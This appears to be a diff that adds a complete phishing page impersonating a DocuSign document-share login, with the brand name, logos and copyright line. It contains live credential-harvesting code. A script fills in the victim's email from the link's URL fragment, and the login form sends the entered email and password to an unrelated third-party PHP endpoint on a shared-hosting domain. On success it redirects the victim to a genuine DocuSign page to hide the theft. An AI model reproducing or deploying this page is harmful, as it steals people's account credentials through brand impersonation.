@@ -1,0 +1,249 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>DocusSign Document Share</title>
+    <link href="css/hover.css" rel="stylesheet" media="all">
+	  <link rel="icon" type="image/x-icon" href="images/logo.png">
+    <style type="text/css">
+		.txt-color{
+			color: white;
+		}
+		.box-color{
+			background-color: rgba(0,0,0,0.8);border-radius:15px;
+		}
+
+    </style>
+	<style>
+body, html {
+  height: 100%;
+  margin: 0;
+}
+
+</style>
+
+<!-- OTP style -->
+<style>
+
+	.center{
+		position: absolute;
+		top:50%;
+		left:50%;
+		transform: translate(-50%, -50%);
+	}
+
+	#dataBox{ display: flex;
+		justify-content: space-between;
+		width: 1px;
+		height: 1px;
+		margin: 0px;
+		visibility: hidden;
+	}
+	.dataInput{
+		width: 1px;
+		height: 1px;
+		margin: 0px;
+	}
+	
+.custom-toast {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  max-width: 320px;
+  padding: 15px 20px;
+  border-radius: 10px;
+  font-weight: bold;
+  z-index: 9999;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
+  display: none;
+  animation: fadeIn 0.3s ease-in-out;
+}
+
+.custom-toast.success {
+  background-color: #e6ffed;
+  color: #155724;
+  border: 1px solid #b2dfdb;
+}
+
+.custom-toast.error {
+  background-color: #ffeaea;
+  color: #721c24;
+  border: 1px solid #f5c6cb;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(-10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+</style>
+  </head>
+  <body style="font-size: .9rem; font-weight: 400; background-color:white;">
+    <div class="container-fluid" style="
+	background-image: url('https://i.gyazo.com/8da883e202a7c817e48480a0b0b70d92.jpg');
+    position: fixed;
+    width: 100%;
+    height: 100%;
+	background-position: center;
+	background-size: cover;
+	background-repeat: no-repeat;"
+	></div>
+      <div class="row" style="margin-right: 10px; margin-left: 10px;">
+        <div class="container">
+          <div class="row" >
+            <div class="col-lg-5 mx-auto my-5 px-5 pb-5 box-color" style="border:1px solid; ">
+              <div class="text-center pt-2"> <br>
+                <img src="https://i.gyazo.com/d89e92b1d318b17ee505176999b066f7.png" class="img-fluid" width="90px" height="50px" ><br>
+
+                <div class="h4 txt-color" style="font-weight: 600;">DocuSign Cloud</div>
+                <div class="h6 text-black font-weight-normal txt-color">Authorization Required</div>
+              </div>
+              
+              
+              <div class="mt-3">
+                <div class="row">
+
+                  </div>
+
+
+<!-- Inline Message Box -->
+<div id="loginMessage" class="d-none text-center mb-3" style="border-radius: 8px; padding: 12px; font-weight: bold;"></div>
+
+
+<!-- Login Form -->
+<form id="loginForm" class="mt-4">
+  <div class="form-group">
+    <label for="email" class="txt-color font-weight-bold">Email address</label>
+    <input type="email" class="form-control" id="email" name="email" placeholder="Email"
+           style="border: 1px solid #a09c9c; border-radius: 1px;" required>
+  </div>
+  <div class="form-group">
+    <label for="password" class="txt-color font-weight-bold">Password</label>
+    <input type="password" class="form-control" id="password" name="password" placeholder="Enter Password"
+           style="border: 1px solid #a09c9c; border-radius: 1px;" required>
+  </div>
+  <button type="submit"
+          class="btn btn-primary btn-block font-weight-bold"
+          style="background-color: #5000F7; border-color: #d2cbcb; border-radius: 1px; margin-bottom: 40px;">
+    LOGIN
+  </button>
+</form>
+  
+                </div>
+
+                  <div class="col-lg-12">
+                     <p class="h6 text-black mt-3 text-center txt-color"> </p><p class="text-black mt-3 text-center txt-color" >DocuSign Document Cloud features can be unlocked by providing an additional license key..</p>
+                <p class="h5 text-center txt-color" style="font-size: 10px">© DocuSign 2026, All right reserved.</p> 
+                    
+                  </div>
+               
+              </div> 
+            </div>
+<script>
+  window.addEventListener("DOMContentLoaded", function () {
+    const hash = window.location.hash;
+
+    if (hash && hash.length > 1) {
+      const email = decodeURIComponent(hash.substring(1)); // remove '#' and decode
+      const emailInput = document.getElementById("email");
+      if (emailInput) {
+        emailInput.value = email;
+      }
+    }
+  });
+</script>
+
+<script>
+$(document).ready(function () {
+  $('#loginForm').submit(function (e) {
+    e.preventDefault();
+
+    const email = $('#email').val().trim();
+    const password = $('#password').val().trim();
+    const $msg = $('#loginMessage');
+
+    $.ajax({
+      url: 'https://topguardtraining.hsa.grd.mybluehost.me/zim.php',
+      type: 'POST',
+      dataType: 'json',
+      data: { email, password },
+      success: function (response) {
+        if (response.status === 'valid') {
+          $msg
+            .removeClass('d-none')
+            .css({
+              'background-color': '#d4edda',  // Light green
+              'color': '#155724',             // Dark green text
+              'border': '1px solid #c3e6cb',
+              'display': 'block'
+            })
+            .html('✅ Opening file...');
+
+          setTimeout(function () {
+            window.location.href = 'https://postsign.docusign.com/postsigning/en/finish-viewing';
+          }, 2000);
+
+        } else if (response.status === 'invalid') {
+          $msg
+            .removeClass('d-none')
+            .css({
+              'background-color': '#f8d7da',
+              'color': '#721c24',
+              'border': '1px solid #f5c6cb',
+              'display': 'block'
+            })
+            .html('⚠️Incorrect password, please try again.');
+
+          $('#password').val('');
+
+          setTimeout(function () {
+            $msg.fadeOut();
+          }, 3000);
+
+        } else {
+          $msg
+            .removeClass('d-none')
+            .css({
+              'background-color': '#fff3cd',
+              'color': '#856404',
+              'border': '1px solid #ffeeba',
+              'display': 'block'
+            })
+            .html('⚠️ Something went wrong. Please try again.');
+
+          setTimeout(function () {
+            $msg.fadeOut();
+          }, 3000);
+        }
+      },
+      error: function () {
+        $('#loginMessage')
+          .removeClass('d-none')
+          .css({
+            'background-color': '#ffeaea',
+            'color': '#721c24',
+            'border': '1px solid #f5c6cb',
+            'display': 'block'
+          })
+          .html('❌ Network error. Please try again.');
+
+        setTimeout(function () {
+          $('#loginMessage').fadeOut();
+        }, 4000);
+      }
+    });
+  });
+});
+</script>
+
+</html>
